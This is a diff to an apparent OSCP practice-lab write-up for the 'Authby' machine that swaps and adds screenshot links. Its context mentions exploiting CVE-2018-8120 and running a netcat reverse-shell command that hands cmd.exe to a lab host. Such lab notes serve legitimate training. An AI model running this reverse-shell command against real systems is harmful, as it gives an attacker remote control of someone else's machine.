@@ -197,4 +197,6 @@ After searching for a while I found the vulnerability [CVE-2018-8120](https://gi
 
 We upload x86 version execution file and execute the netcat command ```nc.exe -e cmd.exe 192.168.49.73 3145```.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h41m21s_016_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h44m50s_016_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h45m09s_017_.png)
